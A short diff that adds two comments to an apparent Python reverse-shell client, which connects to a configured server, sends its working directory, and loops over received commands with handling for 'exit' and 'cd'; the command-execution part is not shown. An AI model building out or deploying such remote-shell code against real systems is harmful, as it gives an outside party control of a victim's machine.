@@ -16,7 +16,7 @@ SEPERATOR = '<sep>'
 sock = socket.socket()
 sock.connect((SERVER_HOST, SERVER_PORT))
 
-cwd = os.getcwd()
+cwd = os.getcwd() #command
 sock.send(cwd.encode())
 
 while True:
@@ -24,7 +24,7 @@ while True:
     splited_command = command.split()
     if command.lower() == 'exit':
         break
-    if splited_command[0].lower() == 'cd':
+    if splited_command[0].lower() == 'cd': #change directory
         try:
             os.chdir(' '.join(splited_command[1:]))
         except FileNotFoundError as e:
